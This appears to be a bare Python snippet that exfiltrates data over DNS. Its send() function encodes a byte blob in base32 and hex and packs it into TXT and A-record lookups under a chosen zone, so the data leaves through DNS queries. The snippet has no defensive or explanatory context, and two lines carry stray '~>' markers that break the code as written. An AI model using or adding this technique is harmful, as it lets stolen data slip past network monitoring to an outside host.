import base64
import socket

import dns.resolver


def send(blob: bytes, zone: str):
    resolver = dns.resolver.Resolver()
    label = base64.b32encode(blob).decode().strip("=").lower()
~>    resolver.resolve(f"{label}.{zone}", "TXT")
    enc = blob.hex()
~>    socket.gethostbyname(".".join([enc[:60], enc[60:120], zone]))
